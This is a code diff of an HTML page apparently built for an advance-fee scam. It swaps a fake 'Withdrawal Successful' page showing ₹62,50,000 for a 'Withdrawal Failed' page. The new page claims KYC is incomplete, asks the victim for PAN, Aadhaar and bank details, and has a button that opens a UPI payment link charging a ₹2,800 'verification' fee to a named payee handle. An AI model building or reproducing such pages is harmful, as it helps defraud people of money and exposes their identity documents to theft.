@@ -1,310 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdrawal Successful | Genius Finance</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            color: #333;
-        }
-        
-        .confirmation-card {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 600px;
-            padding: 40px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .confirmation-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 8px;
-            background: linear-gradient(to right, #4CAF50, #2E7D32);
-        }
-        
-        .success-icon {
-            width: 120px;
-            height: 120px;
-            background: #4CAF50;
-            border-radius: 50%;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            animation: pulse 2s infinite;
-        }
-        
-        .success-icon i {
-            font-size: 70px;
-            color: white;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(76, 175, 80, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
-        }
-        
-        h1 {
-            color: #2E7D32;
-            font-size: 36px;
-            margin-bottom: 25px;
-            font-weight: 700;
-        }
-        
-        .user-info {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 25px 0;
-            text-align: left;
-            border-left: 4px solid #4CAF50;
-        }
-        
-        .info-row {
-            display: flex;
-            margin-bottom: 15px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eee;
-        }
-        
-        .info-row:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
-        .info-label {
-            font-weight: 600;
-            width: 40%;
-            color: #555;
-        }
-        
-        .info-value {
-            font-weight: 700;
-            width: 60%;
-            color: #222;
-        }
-        
-        .amount-display {
-            font-size: 42px;
-            font-weight: 800;
-            color: #1a2a6c;
-            margin: 30px 0;
-            background: linear-gradient(to right, #1a2a6c, #b21f1f);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .transfer-info {
-            background: #e8f5e9;
-            color: #2E7D32;
-            padding: 20px;
-            border-radius: 12px;
-            font-size: 20px;
-            margin: 30px 0;
-            font-weight: 600;
-            border: 2px dashed #4CAF50;
-        }
-        
-        .instructions {
-            background: #e3f2fd;
-            padding: 20px;
-            border-radius: 12px;
-            text-align: left;
-            margin-top: 30px;
-            border-left: 4px solid #2196F3;
-        }
-        
-        .instructions h3 {
-            color: #0d47a1;
-            margin-bottom: 15px;
-            font-size: 20px;
-        }
-        
-        .instructions ul {
-            padding-left: 20px;
-        }
-        
-        .instructions li {
-            margin-bottom: 10px;
-            color: #1565c0;
-        }
-        
-        .contact-support {
-            margin-top: 30px;
-            color: #555;
-            font-size: 16px;
-        }
-        
-        .contact-support a {
-            color: #1a2a6c;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        
-        .contact-support a:hover {
-            text-decoration: underline;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 30px;
-            color: #1a2a6c;
-            font-weight: 700;
-            font-size: 24px;
-        }
-        
-        .logo i {
-            margin-right: 10px;
-            font-size: 32px;
-            color: #4CAF50;
-        }
-        
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background: #ffd700;
-            opacity: 0.8;
-            animation: fall linear forwards;
-        }
-        
-        @keyframes fall {
-            to {
-                transform: translateY(100vh) rotate(360deg);
-                opacity: 0;
-            }
-        }
-        
-        @media (max-width: 600px) {
-            .confirmation-card {
-                padding: 30px 20px;
-            }
-            
-            h1 {
-                font-size: 28px;
-            }
-            
-            .amount-display {
-                font-size: 32px;
-            }
-            
-            .info-label, .info-value {
-                width: 100%;
-                margin-bottom: 5px;
-            }
-            
-            .info-row {
-                flex-direction: column;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>KYC Verification Required</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body {
+      background-color: #fff8f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .box {
+      background-color: #ffffff;
+      padding: 28px 24px;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 440px;
+      width: 100%;
+    }
+
+    h2 {
+      color: #d32f2f;
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 16px;
+      margin: 10px 0;
+      color: #444;
+    }
+
+    .reason {
+      color: #b71c1c;
+      font-weight: bold;
+      margin-top: 14px;
+    }
+
+    .amount {
+      color: #e65100;
+      font-weight: bold;
+      font-size: 18px;
+      margin: 10px 0;
+    }
+
+    ul {
+      text-align: left;
+      padding-left: 20px;
+      font-size: 15px;
+      color: #333;
+    }
+
+    button {
+      background-color: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 20px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1565c0;
+    }
+
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 20px;
+      }
+
+      p, ul {
+        font-size: 15px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="confirmation-card">
-        <div class="logo">
-            <i class="fas fa-crown"></i>
-            <span>GENIUS FINANCE</span>
-        </div>
-        
-        <div class="success-icon">
-            <i class="fas fa-check"></i>
-        </div>
-        
-        <h1>WITHDRAWAL SUCCESSFUL!</h1>
-        
-        <div class="user-info">
-            <div class="info-row">
-                <div class="info-label">Account Holder:</div>
-                <div class="info-value">BHOJRAJ GENIUSES 1019989</div>
-            </div>
-            <div class="info-row">
-                <div class="info-label">Transaction ID:</div>
-                <div class="info-value">TX9876543210</div>
-            </div>
-            <div class="info-row">
-                <div class="info-label">Initiated On:</div>
-                <div class="info-value">July 17, 2025 9:02 am GMT</div>
-            </div>
-        </div>
-        
-        <div class="amount-display">
-            ₹62,50,000
-        </div>
-        
-        <div class="transfer-info">
-            <i class="fas fa-clock"></i> CONGRATULATIONS, YOUR AMOUNT WILL BE TRANSFERRED TO YOUR ACCOUNT WITHIN 24 HOURS
-        </div>
-        
-        <div class="instructions">
-            <h3><i class="fas fa-info-circle"></i> Important Information</h3>
-            <ul>
-                <li>Funds will be deposited to your registered dream 11 account</li>
-                <li>You will receive SMS and email notifications when transfer is completed</li>
-                <li>Contact support if you don't receive funds within 24 hours</li>
-                <li>Transaction may take longer during weekends or holidays</li>
-            </ul>
-        </div>
-        
-        <div class="contact-support">
-            Need assistance? <a href="#"><i class="fas fa-headset"></i> Contact Support</a>
-        </div>
-    </div>
+  <div class="box">
+    <h2>Withdrawal Failed</h2>
+    <p>Your withdrawal of <strong>₹62,50,000</strong> could not be processed.</p>
+    <p class="reason">Reason: KYC Verification Incomplete</p>
+    <p>To complete the KYC and enable withdrawal, please upload the following documents:</p>
+    <ul>
+      <li>1. PAN Card (Front Side)</li>
+      <li>2. Aadhaar Card (Front + Back)</li>
+      <li>3. Bank Account Number with IFSC</li>
+    </ul>
+    <p class="amount">Verification Charge: ₹2,800</p>
+    <button onclick="redirectToUPI()">Pay ₹2,800 Now</button>
+    <p style="font-size: 13px; color: #777; margin-top: 14px;">Payment will be processed securely via UPI</p>
+  </div>
 
-    <script>
-        // Create confetti effect
-        document.addEventListener('DOMContentLoaded', function() {
-            const colors = ['#ffd700', '#4CAF50', '#2196F3', '#e91e63', '#9c27b0'];
-            
-            for (let i = 0; i < 100; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                
-                // Random properties
-                const size = Math.random() * 10 + 5;
-                const posX = Math.random() * 100;
-                const delay = Math.random() * 5;
-                const duration = Math.random() * 3 + 3;
-                const color = colors[Math.floor(Math.random() * colors.length)];
-                
-                confetti.style.width = `${size}px`;
-                confetti.style.height = `${size}px`;
-                confetti.style.backgroundColor = color;
-                confetti.style.left = `${posX}%`;
-                confetti.style.animationDelay = `${delay}s`;
-                confetti.style.animationDuration = `${duration}s`;
-                
-                document.body.appendChild(confetti);
-            }
-        });
-    </script>
+  <script>
+    function redirectToUPI() {
+      const upiLink = "upi://pay?pa=6005973034@ibl&pn=KYC%20Verification&am=2800&cu=INR";
+      window.location.href = upiLink;
+    }
+  </script>
 </body>
 </html>
